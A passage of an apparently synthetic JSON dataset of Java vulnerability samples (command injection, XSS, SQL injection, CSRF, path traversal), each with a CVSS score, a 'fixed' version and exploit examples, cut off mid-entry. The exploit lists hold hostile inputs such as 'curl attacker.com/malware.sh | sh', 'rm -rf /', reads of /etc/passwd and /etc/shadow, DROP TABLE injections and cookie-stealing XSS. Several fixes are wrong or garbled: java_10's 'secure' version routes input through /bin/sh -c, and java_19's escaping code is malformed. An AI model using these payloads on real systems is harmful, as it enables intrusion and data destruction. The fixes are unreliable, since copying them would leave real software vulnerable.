{
    "java_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        try {\n            System.out.print(\"Enter command: \");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "cvss_score": 9.8,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class SecureApp {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        try {\n            System.out.print(\"Enter command: \");\n            String command = reader.readLine();\n            if (command.equals(\"ls\") || command.equals(\"whoami\")) {\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = outputReader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } else {\n                System.out.println(\"Command not allowed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_1": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        if (userInput != null) {\n            response.setContentType(\"text/html\");\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"User Input: \" + userInput);\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class SecureServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        if (userInput != null) {\n            response.setContentType(\"text/html\");\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"User Input: \" + org.owasp.encoder.Encode.forHtml(userInput));\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can inject a script like <script>alert('XSS')</script> to execute arbitrary JavaScript in the user's browser.",
            "They could use <img src=x onerror=alert(document.cookie)> to steal cookies or sensitive data.",
            "Cross-site requests with injected scripts might lead to session hijacking."
        ]
    },
    "java_2": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command: \");\n        String command = reader.readLine();\n        Process process = Runtime.getRuntime().exec(command);\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = output.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n}",
        "cvss_score": 9.8,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecureApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command: \");\n        String command = reader.readLine();\n        if (command.equals(\"allowed_command\")) {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = output.readLine()) != null) {\n                System.out.println(line);\n            }\n        } else {\n            System.out.println(\"Command not allowed\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_3": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "public class VulnerableClass {\\n    public void vulnerableMethod(String input) {\\n        byte[] buffer = new byte[10];\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "public class SecureClass {\\n    public void secureMethod(String input) {\\n        if (input == null || input.length() > 10) {\\n            throw new IllegalArgumentException(\"Input exceeds buffer size\");\\n        }\\n        byte[] buffer = new byte[10];\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, Math.min(10, input.length()));\\n    }\\n}",
        "exploit_ways": [
            "An attacker could provide a string longer than 10 characters to overwrite adjacent memory.",
            "This could lead to executing arbitrary code if the overwritten memory includes return addresses or function pointers.",
            "Attackers might exploit this to gain unauthorized access by manipulating control flow in the program."
        ]
    },
    "java_4": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "public class AuthManager {\n    private String username;\n    private String password;\n\n    public AuthManager(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public boolean login(String user, String pass) {\n        return user.equals(username) && pass.equals(password);\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "public class AuthManager {\n    private byte[] usernameHash;\n    private byte[] passwordHash;\n\n    public AuthManager(String username, String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        this.usernameHash = md.digest(username.getBytes(StandardCharsets.UTF_8));\n        this.passwordHash = md.digest(password.getBytes(StandardCharsets.UTF_8));\n    }\n\n    public boolean login(String user, String pass) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        return Arrays.equals(md.digest(user.getBytes(StandardCharsets.UTF_8)), usernameHash)\n            && Arrays.equals(md.digest(pass.getBytes(StandardCharsets.UTF_8)), passwordHash);\n    }\n}",
        "exploit_ways": [
            "An attacker can brute-force the login credentials due to lack of rate limiting.",
            "If the code is part of a larger system, they could attempt dictionary attacks with common passwords.",
            "The vulnerability allows for easy credential stuffing if username and password pairs are known."
        ]
    },
    "java_5": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String amount = request.getParameter(\"amount\");\n        String destinationAccount = request.getParameter(\"destinationAccount\");\n        // Simulate transferring money without CSRF protection\n        transferMoney(amount, destinationAccount);\n    }\n\n    private void transferMoney(String amount, String destinationAccount) {\n        // Transfer logic here\n    }\n}",
        "cvss_score": 6.8,
        "fixed_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.util.UUID;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String csrfToken = UUID.randomUUID().toString();\n        request.getSession().setAttribute(\"csrfToken\", csrfToken);\n        // Render form with the CSRF token\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String sessionCsrfToken = (String) request.getSession().getAttribute(\"csrfToken\");\n        String requestCsrfToken = request.getParameter(\"csrfToken\");\n\n        if (!sessionCsrfToken.equals(requestCsrfToken)) {\n            throw new SecurityException(\"CSRF Token Validation Failed\");\n        }\n\n        String amount = request.getParameter(\"amount\");\n        String destinationAccount = request.getParameter(\"destinationAccount\");\n        transferMoney(amount, destinationAccount);\n    }\n\n    private void transferMoney(String amount, String destinationAccount) {\n        // Transfer logic here\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious form submission that tricks the victim into transferring funds without their knowledge.",
            "Using social engineering, an attacker can trick users to click on links or visit pages with embedded requests that perform unauthorized actions.",
            "By injecting crafted HTML content in vulnerable applications, attackers can automatically submit forged requests when users browse to the injected page."
        ]
    },
    "java_6": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        Process process = Runtime.getRuntime().exec(command);\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = output.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass SecureApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        if (command.matches(\"[a-zA-Z0-9\\\\s]*\")) {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = output.readLine()) != null) {\n                System.out.println(line);\n            }\n        } else {\n            System.out.println(\"Invalid command.\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete system files.",
            "Could use 'whoami > /tmp/user.txt' to write user information to a file.",
            "Chain commands like 'id; cat /etc/passwd' to execute multiple commands."
        ]
    },
    "java_7": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.util.Scanner;\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\"Enter command to execute:\");\\n        String command = scanner.nextLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.util.Scanner;\\npublic class SecureApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\"Enter command to execute:\");\\n        String command = scanner.nextLine();\\n        if (command.equals(\"allowed_command\")) {\\n            Runtime.getRuntime().exec(command);\\n        } else {\\n            System.out.println(\"Command not allowed\");\\n        }\\n    }\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_8": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "public void bufferOverflowVulnerable(byte[] input) {\n    byte[] buffer = new byte[16];\n    System.arraycopy(input, 0, buffer, 0, input.length);\n}",
        "cvss_score": 7.5,
        "fixed_code": "public void bufferOverflowFixed(byte[] input) {\n    if (input.length > 16) {\n        throw new IllegalArgumentException(\"Input exceeds buffer size\");\n    }\n    byte[] buffer = new byte[16];\n    System.arraycopy(input, 0, buffer, 0, input.length);\n}",
        "exploit_ways": [
            "An attacker can provide an array larger than 16 bytes to overwrite adjacent memory locations.",
            "This could be used to corrupt the stack and execute arbitrary code by overwriting return addresses.",
            "Overwriting control data structures in memory may lead to unauthorized access or system crashes."
        ]
    },
    "java_9": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "public class AuthChecker {\n    public boolean authenticate(String username, String password) {\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            return true;\n        }\n        return false;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "public class AuthChecker {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD_HASH = \"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\"; // Hash of 'password123'\n    public boolean authenticate(String username, String password) {\n        return ADMIN_USERNAME.equals(username) && BCrypt.checkpw(password, ADMIN_PASSWORD_HASH);\n    }\n}",
        "exploit_ways": [
            "An attacker can use the hardcoded credentials to log in as admin.",
            "If the application logs failed attempts, brute force attacks could be performed against the admin account.",
            "Hardcoded passwords are stored insecurely, making it easy for attackers to find them in the codebase."
        ]
    },
    "java_10": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.println(\"Enter command to execute:\");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\npublic class SecureApp {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.println(\"Enter command to execute:\");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", command});\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_11": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\npublic class VulnerableApp {\n    private Connection connect() {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"user\";\n        String password = \"password\";\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n            return null;\n        }\n    }\n\n    public void queryDatabase(String userInput) {\n        String sql = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try (\n                Connection conn = connect();\n                java.sql.Statement stmt = conn.createStatement()) {\n            java.sql.ResultSet rs = stmt.executeQuery(sql);\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \"\\t\" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableApp app = new VulnerableApp();\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String userInput = scanner.nextLine();\n        app.queryDatabase(userInput);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\npublic class SecureApp {\n    private Connection connect() {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"user\";\n        String password = \"password\";\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n            return null;\n        }\n    }\n\n    public void queryDatabase(String userInput) {\n        String sql = \"SELECT * FROM users WHERE username = ?\";\n        try (\n                Connection conn = connect();\n                PreparedStatement pstmt = conn.prepareStatement(sql)) {\n            pstmt.setString(1, userInput);\n            ResultSet rs = pstmt.executeQuery();\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \"\\t\" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        SecureApp app = new SecureApp();\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String userInput = scanner.nextLine();\n        app.queryDatabase(userInput);\n    }\n}",
        "exploit_ways": [
            "User could input \"admin' OR '1'='1\" to retrieve all users.",
            "Could use \"admin'; DROP TABLE users; --\" to delete the users table.",
            "Input like \"admin'; SELECT * FROM passwords; --\" can extract data from another table."
        ]
    },
    "java_12": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass VulnerableApp {\n    public static void main(String[] args) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n            System.out.println(\"Enter command: \");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass SecureApp {\n    public static void main(String[] args) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n            System.out.println(\"Enter command: \");\n            String[] allowedCommands = {\"ls\", \"whoami\"};\n            String command = reader.readLine();\n            for (String cmd : allowedCommands) {\n                if (command.equals(cmd)) {\n                    Process process = Runtime.getRuntime().exec(command);\n                    BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                    String line;\n                    while ((line = outputReader.readLine()) != null) {\n                        System.out.println(line);\n                    }\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_13": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "public void vulnerableFunction(String input) {\n    byte[] buffer = new byte[10];\n    System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n}",
        "cvss_score": 7.5,
        "fixed_code": "public void safeFunction(String input) {\n    byte[] buffer = new byte[10];\n    byte[] inputData = input.getBytes();\n    int lengthToCopy = Math.min(inputData.length, buffer.length);\n    System.arraycopy(inputData, 0, buffer, 0, lengthToCopy);\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 bytes to overwrite adjacent memory.",
            "This overflow could be used to manipulate program execution or corrupt data structures.",
            "In some environments, this vulnerability might allow an attacker to execute arbitrary code."
        ]
    },
    "java_14": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "public String getUserData(String userId) {\n    String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n    return executeQuery(query);\n}",
        "cvss_score": 8.2,
        "fixed_code": "public String getUserData(String userId) {\n    String query = \"SELECT * FROM users WHERE id = ?\";\n    try (PreparedStatement pstmt = connection.prepareStatement(query)) {\n        pstmt.setString(1, userId);\n        return executeQuery(pstmt);\n    } catch (SQLException e) {\n        e.printStackTrace();\n    }\n    return null;\n}",
        "exploit_ways": [
            "An attacker could input ' OR '1'='1 to retrieve all user data.",
            "The attacker can inject a UNION SELECT statement to extract sensitive information from other tables.",
            "Using input like '; DROP TABLE users; --', an attacker can delete the users table, leading to data loss."
        ]
    },
    "java_15": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        Runtime.getRuntime().exec(command);\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecureApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        if (command.equals(\"allowed_command\")) {\n            Runtime.getRuntime().exec(command);\n        } else {\n            System.out.println(\"Command not allowed.\");\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "java_16": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "import java.nio.ByteBuffer;\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        byte[] data = new byte[10];\n        ByteBuffer buffer = ByteBuffer.wrap(data);\n        for (int i = 0; i < 20; i++) {\n            buffer.put((byte) i);\n        }\n    }\n}",
        "cvss_score": 7.8,
        "fixed_code": "import java.nio.ByteBuffer;\npublic class SecureApp {\n    public static void main(String[] args) {\n        byte[] data = new byte[20];\n        ByteBuffer buffer = ByteBuffer.wrap(data);\n        for (int i = 0; i < 20; i++) {\n            if (buffer.hasRemaining()) {\n                buffer.put((byte) i);\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could inject data that overwrites adjacent memory, potentially altering the program's execution flow.",
            "The vulnerability might allow a crafted input to execute unintended code if the overflow can overwrite return addresses on the stack.",
            "Buffer overflow can lead to a Denial of Service (DoS) condition by causing the application to crash or behave unpredictably."
        ]
    },
    "java_17": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "public class BufferOverflowExample {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        String input = \"A very long string that will cause an overflow when copied to the small buffer\";\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n    }\n}",
        "cvss_score": 7.8,
        "fixed_code": "public class BufferOverflowExample {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        String input = \"A very long string that will cause an overflow when copied to the small buffer\";\n        byte[] inputBytes = input.getBytes();\n        System.arraycopy(inputBytes, 0, buffer, 0, Math.min(inputBytes.length, buffer.length));\n    }\n}",
        "exploit_ways": [
            "An attacker can craft an extremely long string to overwrite adjacent memory and potentially execute arbitrary code.",
            "The overflow could corrupt the stack, leading to program crashes or unpredictable behavior.",
            "By carefully crafting input, an attacker might be able to manipulate function pointers on the stack to redirect execution flow."
        ]
    },
    "java_18": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String account = request.getParameter(\"account\");\n        String amount = request.getParameter(\"amount\");\n        \n        // Simulate a bank transfer operation\n        if (account != null && amount != null) {\n            // Transfer logic here...\n            response.getWriter().println(\"Transfer of \" + amount + \" to account \" + account + \" completed successfully.\");\n        }\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.util.UUID;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String csrfToken = UUID.randomUUID().toString();\n        request.getSession().setAttribute(\"csrfToken\", csrfToken);\n        // Render a form with the token in a hidden field\n        response.getWriter().println(\"<form action='transfer' method='post'>\\n\" +\n            \"    <input type='hidden' name='csrfToken' value='\" + csrfToken + \"'>\\n\" +\n            \"    Account: <input type='text' name='account'><br>\\n\" +\n            \"    Amount: <input type='text' name='amount'><br>\\n\" +\n            \"    <input type='submit' value='Transfer'>\\n</form>\");\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String sessionToken = (String) request.getSession().getAttribute(\"csrfToken\");\n        String requestToken = request.getParameter(\"csrfToken\");\n        if (!sessionToken.equals(requestToken)) {\n            response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n            return;\n        }\n\n        String account = request.getParameter(\"account\");\n        String amount = request.getParameter(\"amount\");\n        \n        // Simulate a bank transfer operation\n        if (account != null && amount != null) {\n            // Transfer logic here...\n            response.getWriter().println(\"Transfer of \" + amount + \" to account \" + account + \" completed successfully.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into visiting a malicious site that submits a POST request to the transfer endpoint.",
            "Using social engineering, an attacker can convince the user to click a link that performs a malicious action on their behalf.",
            "An attacker can craft a form that auto-submits in the background using JavaScript to execute unauthorized transfers."
        ]
    },
    "java_19": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSSExampleServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.getWriter().println(\"<html><body><h1>\" + userInput + \"</h1></body></html>\");\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSSExampleServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String safeInput = escapeHtml(userInput);\n        response.getWriter().println(\"<html><body><h1>\" + safeInput + \"</h1></body></html>\");\n    }\n\n    private String escapeHtml(String input) {\n        if (input == null) return null;\n        return input.replace(\"&\", \"&amp;\")\n                    .replace(\\\"<\\\", \\\"&lt;\\\")\n                    .replace(\\\">\\\", \\\"&gt;\\\")\n                    .replace(\\\"\\\\\"\\\", \\\"&quot;\\\")\n                    .replace(\\\"'\\\", \"&#x27;\");\n    }\n}",
        "exploit_ways": [
            "An attacker could inject a script like <script>alert('XSS')</script> to execute arbitrary JavaScript.",
            "They can use <img src=x onerror=alert(document.cookie)> to steal cookies or other sensitive data.",
            "By injecting <iframe src=malicious.com></iframe>, an attacker can load malicious content into the victim's browser."
        ]
    },
    "java_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "public class VulnerableClass {\\n    public void executeCommand(String command) throws Exception {\\n        ProcessBuilder pb = new ProcessBuilder();\\n        String os = System.getProperty(\"os.name\").toLowerCase();\\n        if (os.contains(\"win\")) {\\n            pb.command(\"cmd.exe\", \"/c\", command);\\n        } else {\\n            pb.command(\"sh\", \"-c\", command);\\n        }\\n        Process process = pb.start();\\n        process.waitFor();\\n    }\\n}",
        "cvss_score": 8.2,
        "fixed_code": "public class SecureClass {\\n    public void executeCommand(String command) throws Exception {\\n        String[] allowedCommands = {\"ls\", \"whoami\"};\\n        boolean isAllowed = false;\\n        for (String cmd : allowedCommands) {\\n            if (cmd.equals(command)) {\\n                isAllowed = true;\\n                break;\\n            }\\n        }\\n        if (isAllowed) {\\n            ProcessBuilder pb = new ProcessBuilder();\\n            String os = System.getProperty(\"os.name\").toLowerCase();\\n            if (os.contains(\"win\")) {\\n                pb.command(\"cmd.exe\", \"/c\", command);\\n            } else {\\n                pb.command(\"sh\", \"-c\", command);\\n            }\\n            Process process = pb.start();\\n            process.waitFor();\\n        } else {\\n            throw new IllegalArgumentException(\"Command not allowed\");\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input 'sudo rm -rf /' to delete all files on the system.",
            "They can use 'whoami; cat /etc/shadow' to attempt to leak sensitive information.",
            "Exploiting with 'curl http://attacker.com/malware.sh | sh' can lead to remote code execution."
        ]
    },
    "java_21": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.File;\nimport java.io.FileReader;\npublic class FileReadExample {\n    public void readFile(String fileName) {\n        try {\n            File file = new File(fileName);\n            FileReader fr = new FileReader(file);\n            int i;\n            while ((i=fr.read()) != -1)\n                System.out.print((char) i);\n            fr.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.File;\nimport java.nio.file.Paths;\nimport java.io.FileReader;\npublic class FileReadExample {\n    private static final String BASE_DIR = \"/safe/directory\";\n    public void readFile(String fileName) {\n        try {\n            File file = Paths.get(BASE_DIR, fileName).toFile();\n            if (!file.toPath().startsWith(Paths.get(BASE_DIR))) {\n                throw new SecurityException(\"Access Denied\");\n            }\n            FileReader fr = new FileReader(file);\n            int i;\n            while ((i=fr.read()) != -1)\n                System.out.print((char) i);\n            fr.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input \"../etc/passwd\" to read the system's password file.",
            "By using path traversal, they might access sensitive application configuration files like database credentials.",
            "Accessing log files through paths such as \"../../logs/application.log\" can lead to leakage of sensitive information."
        ]
    },
    "java_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass UnsafeClass {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        String command = reader.readLine();\n        Runtime.getRuntime().exec(command);\n    }\n}",
        "cvss_score": 8.2,
